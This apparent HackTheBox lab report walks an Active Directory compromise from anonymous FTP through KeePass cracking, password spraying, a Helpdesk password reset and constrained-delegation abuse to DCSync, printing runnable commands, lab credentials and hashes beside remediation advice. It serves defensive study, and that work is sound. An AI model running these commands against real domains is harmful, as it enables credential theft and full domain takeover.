---
title: "Redelegate — Full AD Compromise via Anonymous FTP, KeePass and Constrained Delegation"
description: "A complete penetration test report of a Windows Active Directory environment: anonymous FTP exposing a KeePass database, password policy inference, MSSQL RID brute-force, Helpdesk abuse, SYSVOL policy enumeration, and constrained delegation with protocol transition. From unauthenticated network position to Domain Admin in a single chain."
date: 2026-10-08
status: "research"
category: "Red Team"
stack: [Active Directory, Kerberos, Constrained Delegation, KeePass, MSSQL, BloodHound, BloodyAD, Impacket, NetExec]
tags: [active-directory, constrained-delegation, kerberos, keepass, ftp, mssql, dcsync, privilege-escalation, pentest-report]
---

# Penetration Test Report — Redelegate

**Target:** `10.129.69.246` (dc.redelegate.vl)
**Domain:** `redelegate.vl`
**Assessment Type:** Internal Network / Active Directory
**Testing Period:** 8 October 2026
**Classification:** Lab Environment (HackTheBox)
**Overall Risk Rating:** **CRITICAL**

---

## Executive Summary

The assessment identified a complete Active Directory domain compromise through a chain of six vulnerabilities and misconfigurations. Starting from an unauthenticated network position with no credentials, the tester obtained Domain Administrator privileges in approximately three hours.

The attack path begins with an **anonymous FTP service** on port 21 that exposes three files: a security audit report (`CyberAudit.txt`), a KeePass credential database (`Shared.kdbx`), and an employee training agenda (`TrainingAgenda.txt`). The audit report and training agenda together revealed the organization's password policy with unusual precision — the training agenda explicitly listed "Why `SeasonYear!` is not a good password" as a topic, and the audit report confirmed that weak user passwords were a known finding. The tester generated a wordlist from this policy, cracked the KeePass database password (`Fall2024!`), and extracted the credentials of the `SQLGuest` service account.

MSSQL was exposed on port `49932` and accepted local authentication. Using `SQLGuest`, the tester performed RID brute-force via the MSSQL service and enumerated the entire domain: users, groups, computers, and service accounts. A password spray using the KeePass-extracted credentials revealed that the domain user `Marie.Curie` had reused the KeePass database password as her domain password. Marie.Curie was a member of the `Helpdesk` group, which had permission to reset passwords for any user in the domain.

The tester reset the password of `Helen.Frost`, a member of the `IT` group. Through BloodHound and manual LDAP enumeration, the tester identified that `IT` had `GenericAll` over the `FS01$` computer account. Manual enumeration of the SYSVOL revealed a Group Policy setting (`SeEnableDelegationPrivilege`) that granted delegation configuration rights to a specific account RID (`1106`). By mapping RIDs to domain objects, the tester identified this as `Helen.Frost` — meaning she had the domain-level privilege required to configure Kerberos delegation. Combined with `GenericAll` over `FS01$`, this enabled the full constrained delegation attack.

Using Helen's access, the tester configured **constrained delegation with protocol transition** on `FS01$`, pointing it at `CIFS/DC.redelegate.vl`. The tester requested a Kerberos ticket impersonating the Domain Controller machine account (`DC$`) via S4U2Self + S4U2Proxy, used that ticket to perform **DCSync**, and extracted both the `Administrator` and `Ryan.Cooper` (Domain Admin) password hashes. The `Administrator` account had the `NOT_DELEGATED` flag set, which prevented impersonation of that specific user — but the `DC$` machine account did not, which allowed the chain to continue.

### Business Impact

A complete compromise of the Active Directory domain. An attacker with these privileges can access all domain-joined systems, extract credentials for every user and service account, modify or delete any data, and establish persistence that survives password resets.

The exposure is not theoretical: it requires no zero-day and no pre-existing privileged access. Every vulnerability in the chain is a known misconfiguration with a documented fix. The most consequential findings are the anonymous FTP exposure and the excessive `SeEnableDelegationPrivilege` granted to a non-administrative user.

For a full technical deep dive into Kerberos constrained delegation, protocol transition, and the S4U2Self / S4U2Proxy mechanism, see the dedicated research article: **[Constrained Delegation — From GenericAll to Domain Admin →](/research/constrained-delegation-explained)**.

### Immediate Actions Required

| Priority | Action | Timeline |
|---|---|---|
| **P0** | Remove anonymous access from all FTP shares | 24 hours |
| **P0** | Enforce a strong password policy; ban `SeasonYear!` patterns | 24 hours |
| **P0** | Audit and restrict `Helpdesk` group password reset permissions | 48 hours |
| **P0** | Remove `SeEnableDelegationPrivilege` from non-administrative accounts | 48 hours |
| **P1** | Enable "Account is sensitive and cannot be delegated" on all privileged accounts | 1 week |
| **P1** | Audit and remove unnecessary constrained delegation configurations | 1 week |
| **P1** | Restrict `GenericAll` and `Write` permissions over computer accounts | 1 week |
| **P2** | Restrict `ms-DS-MachineAccountQuota` and monitor delegation attribute changes | 2 weeks |

---

## Scope and Methodology

### In-Scope

- Single host: `10.129.69.246` (Windows Server 2022, Domain Controller)
- All TCP services exposed by the host, including Active Directory (LDAP, Kerberos, SMB, DNS), FTP, IIS, MSSQL, and WinRM
- The anonymous FTP share and its contents
- The SYSVOL share and its Group Policy files

### Out-of-Scope

- Any host other than `10.129.69.246`. Only this IP is reachable from the assessment network.

### Methodology

The assessment followed the PTES (Penetration Testing Execution Standard) with emphasis on Active Directory attack paths:

1. **Reconnaissance** — Network scanning, service enumeration
2. **Initial Access** — Anonymous FTP, KeePass database cracking
3. **Foothold** — MSSQL enumeration, password spraying, Kerberos authentication
4. **Enumeration** — BloodHound analysis, SYSVOL Group Policy review, RID mapping
5. **Privilege Escalation** — Helpdesk abuse, GenericAll exploitation, constrained delegation
6. **Post-Exploitation** — S4U2Self + S4U2Proxy, DCSync, credential extraction

---

## Findings

### Finding 1 — Anonymous FTP Access to Sensitive Files

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-284 (Improper Access Control) |
| **MITRE ATT&CK** | T1135 (Network Share Discovery), T1039 (Data from Network Shared Drive) |

**Description**

The FTP service on port 21 allows anonymous login (`ftp-anon: Anonymous FTP login allowed`). The share contains three files:

- `CyberAudit.txt` — a recent security audit report
- `Shared.kdbx` — a KeePass credential database
- `TrainingAgenda.txt` — an employee training schedule

Together, these three files provided the tester with a complete picture of the organization's password policy and a credential store protected only by a single password.

**Evidence**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
```

The `CyberAudit.txt` file outlined the organization's own findings:

```
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:
1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:
1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

The `TrainingAgenda.txt` file provided the password policy hint:

```
Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password
```

**Impact**

The KeePass database was cracked offline (Finding 2), yielding valid domain credentials. The audit report and training agenda provided the exact password policy pattern needed to build a targeted wordlist.

**Remediation**

- Disable anonymous access on all FTP services.
- Restrict FTP access to specific authenticated users or IP ranges.
- Do not store credential databases or audit reports on file shares accessible to unprivileged users.
- Assume any file stored on an anonymously-accessible share is compromised.

---

### Finding 2 — Weak KeePass Database Password

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **MITRE ATT&CK** | T1555 (Credentials from Password Stores) |

**Description**

The KeePass database `Shared.kdbx` was protected by the password `Fall2024!`. This password matched the pattern that the organization's own training agenda had flagged as dangerous (`SeasonYear!`). The password was cracked offline using a wordlist generated from that pattern.

The wordlist was generated with a simple Python script:

```python
# gen_wordlist.py
words = [
    'Spring', 'Summer', 'Autumn', 'Fall', 'Winter',
    'January', 'February', 'March', 'April', 'May', 'June',
    'July', 'August', 'September', 'October', 'November', 'December'
]
years = ['2023', '2024', '2025']
suffix = '!'

with open('spray.txt', 'w') as f:
    for w in words:
        for y in years:
            f.write(f"{w}{y}{suffix}\n")
```

The KeePass hash was extracted with `keepass2john`:

```bash
keepass2john Shared.kdbx >> hash.txt
```

And cracked with John the Ripper:

```bash
john --wordlist=spray.txt hash.txt
Fall2024!  (Shared.kdbx)
```

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/john-crack-keepass.png" alt="John the Ripper output cracking the KeePass database" />
  <figcaption>John the Ripper cracks the KeePass database password using the SeasonYear! wordlist</figcaption>
</figure>

The cracked database contained credentials for multiple accounts, including:

```
SQLGuest : zDPBpaF4FywlqIv11vii
```

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/keepass-sqlguest-credentials.png" alt="KeePass database showing SQLGuest credentials" />
  <figcaption>The cracked KeePass database contains the SQLGuest service account credentials</figcaption>
</figure>

**Impact**

The `SQLGuest` credentials provided MSSQL access on port `49932` and enabled enumeration of the entire Active Directory domain (Finding 3).

**Remediation**

- Use a strong, unique, randomly-generated password for the KeePass database (ideally via a passphrase of 4+ words plus a numeric suffix).
- Never store the database on an anonymously-accessible file share.
- Enforce a password policy that bans predictable patterns like `SeasonYear!`, `MonthYear!`, and `CompanyNameYear!`.
- Deploy a breached-password blocklist that includes common patterns.

---

### Finding 3 — MSSQL Access and Full Domain Enumeration via RID Brute-Force

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.1 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **MITRE ATT&CK** | T1087.002 (Account Discovery: Domain Account) |

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/mssql-guest-login.png" alt="MSSQL login as SQLGuest" />
  <figcaption>MSSQL on port 49932 accepts local authentication with the SQLGuest account</figcaption>
</figure>

**Description**

Microsoft SQL Server 2019 was exposed on port `49932` and accepted local authentication. Using the `SQLGuest` credentials obtained from the KeePass database, the tester authenticated to MSSQL and used its RID brute-force capability to enumerate every security principal in the domain.

The `--rid-brute` module of NetExec, when run against MSSQL, enumerates RIDs by querying the SQL Server for its `SUSER_SID` and then resolving each well-known RID via `SUSER_NAME`. This returns the full list of domain users, groups, and computers without requiring LDAP access.

**Evidence**

```bash
nxc mssql 10.129.69.246 -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' \
  --port 49932 --local-auth --rid-brute
```

Selected output:

```
498: REDELEGATE\Enterprise Read-only Domain Controllers
500: WIN-Q13O908QBPG\Administrator
502: REDELEGATE\krbtgt
512: REDELEGATE\Domain Admins
...
1002: REDELEGATE\DC$
1103: REDELEGATE\FS01$
1104: REDELEGATE\Christine.Flanders
1105: REDELEGATE\Marie.Curie
1106: REDELEGATE\Helen.Frost
1107: REDELEGATE\Michael.Pontiac
1108: REDELEGATE\Mallory.Roberts
1109: REDELEGATE\James.Dinkleberg
1112: REDELEGATE\Helpdesk
1113: REDELEGATE\IT
1114: REDELEGATE\Finance
1115: REDELEGATE\DnsAdmins
1117: REDELEGATE\Ryan.Cooper
1119: REDELEGATE\sql_svc
```

The output also revealed the RID-to-principal mapping that would become critical later: **RID 1106 = Helen.Frost**.

**Impact**

The full principal list enabled targeted password spraying (Finding 4) and provided the RID mapping necessary to interpret the Group Policy finding (Finding 6).

**Remediation**

- Restrict MSSQL access to specific authenticated users.
- Remove the `SQLGuest` account if it is not required.
- Do not expose MSSQL on non-standard ports without additional access controls.
- Monitor for high-volume RID enumeration queries.

---

### Finding 4 — Password Reuse Across Domains

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **MITRE ATT&CK** | T1110.003 (Password Spraying), T1078 (Valid Accounts) |

**Description**

The KeePass database password `Fall2024!` was reused by the domain user `Marie.Curie` as her domain password. A password spray using the credentials extracted from the database, combined with the user list obtained via MSSQL RID brute-force, revealed the reuse.

**Evidence**

```bash
nxc smb 10.129.69.246 -u users.txt -p passwords.txt --continue-on-success
SMB  10.129.69.246  445  DC  [+] redelegate.vl\Marie.Curie:Fall2024!
```

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/password-spray-marie-curie.png" alt="Password spray showing Marie.Curie credential reuse" />
  <figcaption>Password spraying with the KeePass credentials reveals that Marie.Curie reused the database password</figcaption>
</figure>

**Impact**

Marie.Curie was a member of the `Helpdesk` group, which had permission to reset passwords for any user in the domain (Finding 5).

**Remediation**

- Enforce unique passwords across all accounts.
- Ban password reuse at the domain level.
- Deploy a breached-password blocklist.
- Deploy a password manager that generates unique credentials per service.

---

### Finding 5 — Excessive Helpdesk Password Reset Permissions

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.6 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1098 (Account Manipulation) |

**Description**

The `Helpdesk` group had permission to reset passwords for all users in the domain. The tester used Marie.Curie's access to reset the password of `Helen.Frost`, a member of the `IT` group.

The password reset was performed remotely via the RPC `net rpc password` command, which uses MS-SAMR to change a user's password. Because Marie.Curie was in the Helpdesk group, the reset succeeded without requiring knowledge of Helen's old password.

**Evidence**

```bash
net rpc password "Helen.Frost" "newP@ssword2022" \
  -U "redelegate.vl"/"Marie.Curie"%'Fall2024!' \
  -S "10.129.69.246"
```

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/bloodhound-marie-reset-perms.png" alt="BloodHound showing Marie.Curie password reset permissions" />
  <figcaption>BloodHound shows that Marie.Curie, as a member of Helpdesk, can reset passwords for any user</figcaption>
</figure>

**Impact**

The tester obtained access to Helen.Frost, which was a member of the `IT` group with `GenericAll` over the `FS01$` computer account (Finding 7).

**Remediation**

- Restrict Helpdesk password reset permissions to specific users or OUs.
- Implement tiered administration to prevent privilege escalation chains.
- Monitor for password reset events (Event ID 4724).
- Require manager approval for password resets of privileged accounts.

---

### Finding 6 — Dangerous Group Policy Setting: SeEnableDelegationPrivilege

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1098 (Account Manipulation), T1558 (Steal or Forge Kerberos Tickets) |

**Description**

The SYSVOL share was accessible to authenticated users (which is expected — SYSVOL contains Group Policy files that must be readable by domain members). Enumerating the policies revealed a critical misconfiguration: the `SeEnableDelegationPrivilege` was granted to a specific account by RID.

**Evidence**

```bash
smbclient //dc.redelegate.vl/SYSVOL \
  -U 'redelegate.vl\Marie.Curie%Fall2024!' \
  -c 'recurse ON; prompt OFF; mget *'
```

The file `Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf` contained:

```
SeEnableDelegationPrivilege = *S-1-5-32-544,*S-1-5-21-4024337825-2033394866-2055507597-1106
```

Decoding the SIDs:

- `S-1-5-32-544` — the built-in `Administrators` group
- `S-1-5-21-4024337825-2033394866-2055507597-1106` — the domain `Helen.Frost` account (RID `1106`)

**Impact**

Helen.Frost had the `SeEnableDelegationPrivilege`, which is the domain-level right required to configure Kerberos delegation on any account. Combined with `GenericAll` over the `FS01$` computer account (Finding 7), this enabled the full constrained delegation attack (Finding 8).

The `SeEnableDelegationPrivilege` is a **domain-wide** privilege. It is not normally granted to non-administrative users. When granted to a regular account, it effectively grants that account the ability to configure delegation on any Kerberos-enabled service in the domain — including services running on the Domain Controller itself.

**Remediation**

- Remove `SeEnableDelegationPrivilege` from all non-administrative accounts.
- Audit Group Policy settings that grant domain-level privileges.
- Implement tiered administration: delegation configuration should be a Tier-0 operation.
- Monitor for changes to the `SeEnableDelegationPrivilege` setting (Event ID 4739 with the privilege name).

---

### Finding 7 — GenericAll over a Computer Account

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.6 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1098 (Account Manipulation) |

**Description**

The `IT` group had `GenericAll` over the `FS01$` computer account. BloodHound and manual LDAP enumeration confirmed this. The tester enumerated the object with `bloodyAD`:

```bash
bloodyAD -u Marie.Curie -p 'Fall2024!' -d redelegate.vl --host dc.redelegate.vl \
  get object 'FS01$' --resolve-sd
```

Relevant output:

```
nTSecurityDescriptor.ACL.6.Trustee: ACCOUNT_OPERATORS; LOCAL_SYSTEM; IT; Domain Admins
nTSecurityDescriptor.ACL.6.Right: GENERIC_ALL
```

The `IT` group had three members (from BloodHound):

| User | Status | Notes |
|---|---|---|
| `Ryan.Cooper` | Active | Domain Admin — password change would be detected |
| `Mallory.Roberts` | Disabled | Cannot be used |
| `Helen.Frost` | Active | Target — password was already reset by the tester |

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/bloodhound-it-genericall.png" alt="BloodHound showing IT group GenericAll over FS01" />
  <figcaption>BloodHound reveals that the IT group has GenericAll over the FS01$ computer account</figcaption>
</figure>

**Impact**

With `GenericAll` over `FS01$`, the tester could modify any attribute of the computer account, including the delegation configuration. The `SeEnableDelegationPrivilege` (Finding 6) provided the domain-level right needed for the delegation attribute modification.

**Remediation**

- Audit and remove `GenericAll` and `Write` permissions over computer accounts from non-administrative groups.
- The `IT` group should not have full control over production computer accounts. Delegation of administrative tasks should be scoped to specific OUs or attributes.
- Monitor for changes to computer account attributes (Event ID 4742).

---

### Finding 8 — Constrained Delegation with Protocol Transition

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1558.003 (Steal or Forge Kerberos Tickets) |

**Description**

The `FS01$` computer account was configured with **constrained delegation with protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`) and had the `msDS-AllowedToDelegateTo` attribute set to `cifs/DC.redelegate.vl`. This allowed the tester to request a Kerberos ticket impersonating the Domain Controller machine account (`DC$`).

**Evidence — Step 1: Configure the delegation**

```bash
bloodyAD -u Helen.Frost -p 'newP@ssword2022' -d redelegate.vl --host dc.redelegate.vl \
  add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```bash
bloodyAD -u Helen.Frost -p 'newP@ssword2022' -d redelegate.vl --host dc.redelegate.vl \
  set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/DC.redelegate.vl'
```

Validation:

```bash
bloodyAD ... get object 'FS01$' --attr msDS-AllowedToDelegateTo
distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
msDS-AllowedToDelegateTo: cifs/DC.redelegate.vl

bloodyAD ... get object 'FS01$' --attr userAccountControl
distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION
```

**Evidence — Step 2: Request the impersonation ticket**

```bash
impacket-getST -spn 'cifs/DC.redelegate.vl' -impersonate 'DC$' \
  -dc-ip 10.129.69.246 'redelegate.vl/FS01$:NewPass123!'
[*] Getting TGT for user
[*] Impersonating DC$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC$@cifs_DC.redelegate.vl@REDELEGATE.VL.ccache
```

**Evidence — Step 3: DCSync**

The Administrator account was protected with the `NOT_DELEGATED` flag:

```bash
bloodyAD ... get object 'Administrator' --attr userAccountControl
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
```

But the `DC$` machine account was not. The tester used the impersonated `DC$` ticket to perform DCSync:

```bash
export KRB5CCNAME=DC\$@cifs_DC.redelegate.vl@REDELEGATE.VL.ccache
impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
```

The tester also extracted the Domain Admin `Ryan.Cooper`:

```bash
impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Ryan.Cooper
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
```

**Impact**

The impersonated `DC$` ticket granted full replication rights, enabling DCSync. The tester extracted the `Administrator` and `Ryan.Cooper` password hashes and used the Administrator hash to obtain a remote shell.

**Remediation**

- Enable "Account is sensitive and cannot be delegated" (`NOT_DELEGATED`) on all privileged accounts, including machine accounts of Domain Controllers.
- Remove unnecessary `msDS-AllowedToDelegateTo` entries.
- Audit and restrict `GenericAll` permissions over computer accounts.
- Remove `SeEnableDelegationPrivilege` from non-administrative accounts.
- Monitor for changes to `msDS-AllowedToDelegateTo` and `TRUSTED_TO_AUTH_FOR_DELEGATION` (Event ID 5136).
- Monitor for S4U2Self and S4U2Proxy ticket requests (Event ID 4769 with unusual SPNs).

For a full explanation of how constrained delegation works, see the **[Constrained Delegation deep dive →](/research/constrained-delegation-explained)**.

---

## Attack Chain

The following diagram shows the complete attack path from unauthenticated network position to Domain Administrator.

```
[1] Anonymous FTP access
    ftp anonymous@10.129.69.246
    → CyberAudit.txt, Shared.kdbx, TrainingAgenda.txt
    │
    ▼
[2] Password policy inference
    CyberAudit.txt: "Weak User Passwords" finding
    TrainingAgenda.txt: "Why SeasonYear! is not a good password"
    │
    ▼
[3] KeePass cracking
    gen_wordlist.py → spray.txt (Season + Year + !)
    keepass2john Shared.kdbx → hash.txt
    john → Fall2024!
    │
    ▼
[4] Credential extraction
    SQLGuest : zDPBpaF4FywlqIv11vii
    │
    ▼
[5] MSSQL enumeration
    nxc mssql --local-auth --rid-brute
    → Full domain principal list
    → RID 1106 = Helen.Frost
    │
    ▼
[6] Password spraying
    nxc smb users.txt passwords.txt
    → Marie.Curie : Fall2024! (password reuse)
    │
    ▼
[7] BloodHound enumeration
    Marie.Curie ∈ Helpdesk group
    Helpdesk → ForceChangePassword over all domain users
    │
    ▼
[8] Password reset
    net rpc password Helen.Frost newP@ssword2022
    │
    ▼
[9] SYSVOL policy enumeration
    smbclient SYSVOL → GptTmpl.inf
    SeEnableDelegationPrivilege = *S-1-5-32-544,*S-1-5-21-...-1106
    → RID 1106 = Helen.Frost
    │
    ▼
[10] BloodHound + LDAP enumeration
     IT group → GenericAll over FS01$
     IT members: Ryan.Cooper (DA), Mallory.Roberts (disabled), Helen.Frost (controlled)
     │
     ▼
[11] Constrained delegation configuration
     add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
     set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/DC.redelegate.vl'
     │
     ▼
[12] S4U2Self + S4U2Proxy
     impacket-getST -spn 'cifs/DC.redelegate.vl' -impersonate 'DC$'
     → DC$@cifs_DC.redelegate.vl@REDELEGATE.VL.ccache
     │
     ▼
[13] DCSync
     impacket-secretsdump -k -no-pass -just-dc-user Administrator
     Administrator:500:...:ec17f7a2a4d96e177bfd101b94ffc0a7
     │
     ▼
[14] Domain Admin Access
     nxc smb 10.129.69.246 -u Administrator -H 'ec17f7a2...' -x 'whoami'
     redelegate\administrator
```

---

## Recommendations Summary

| Priority | Finding | Recommendation |
|---|---|---|
| P0 | Anonymous FTP | Disable anonymous access |
| P0 | Weak KeePass password | Enforce strong, unique passwords |
| P0 | Helpdesk permissions | Restrict password reset permissions |
| P0 | SeEnableDelegationPrivilege | Remove from non-administrative accounts |
| P1 | Password reuse | Enforce unique passwords, ban reuse |
| P1 | GenericAll over FS01$ | Audit and remove excessive ACLs |
| P1 | Constrained delegation | Audit and restrict delegation configs |
| P1 | Privileged accounts | Enable "sensitive and cannot be delegated" |
| P2 | DCSync | Monitor for DRSUAPI replication events |

---

## Appendix — Tools and References

**Tools used in this assessment:**

- `nmap` — port scanning and service detection
- `ftp` — anonymous FTP access
- `keepass2john` — KeePass hash extraction
- `john` — offline password cracking
- `NetExec (nxc)` — MSSQL enumeration, RID brute-force, password spraying
- `BloodHound` — Active Directory attack path analysis
- `BloodyAD` — LDAP operations, ACL abuse, delegation configuration
- `smbclient` — SYSVOL Group Policy enumeration
- `net rpc` — password reset via MS-SAMR
- `Impacket` — `getST` (S4U2Self + S4U2Proxy), `secretsdump` (DCSync)
- `evil-winrm` / `nxc smb -x` — remote shell access

**Full technical deep dive:** [Constrained Delegation — From GenericAll to Domain Admin →](/research/constrained-delegation-explained)

**References:**

- Microsoft Docs — Kerberos Constrained Delegation Overview
- Microsoft Docs — SeEnableDelegationPrivilege
- SpecterOps — "A Guide to Kerberos Delegation" (2023)
- Elad Shamir — "Wagging the Dog: Abusing Resource-Based Constrained Delegation" (2019)
- MITRE ATT&CK T1558 — Steal or Forge Kerberos Tickets
- MITRE ATT&CK T1098 — Account Manipulation

---

## Takeaway

The Redelegate chain demonstrates how a sequence of seemingly minor misconfigurations — an anonymous FTP share, a weak KeePass password, password reuse, excessive Helpdesk permissions, and a dangerous Group Policy setting — can be combined into a complete Active Directory compromise.

The single most consequential finding is the **`SeEnableDelegationPrivilege` granted to a non-administrative user** (`Helen.Frost`, RID 1106). This privilege is normally reserved for Domain Admins because it allows the holder to configure Kerberos delegation on any account in the domain. Granting it to a regular user, combined with `GenericAll` over a computer account, is effectively granting Domain Admin — even though the user does not appear in any privileged group.

The second lesson is that **`NOT_DELEGATED` must be applied to all privileged accounts, including machine accounts**. The Administrator account was protected — but the `DC$` machine account was not, which is what enabled the DCSync.

The third lesson is that **Group Policy settings that grant domain-level privileges should be treated as Tier-0 assets**. The `SeEnableDelegationPrivilege` setting in `GptTmpl.inf` is exactly the kind of configuration that gets forgotten after initial deployment and then becomes the bridge between a low-privileged user and full domain compromise.
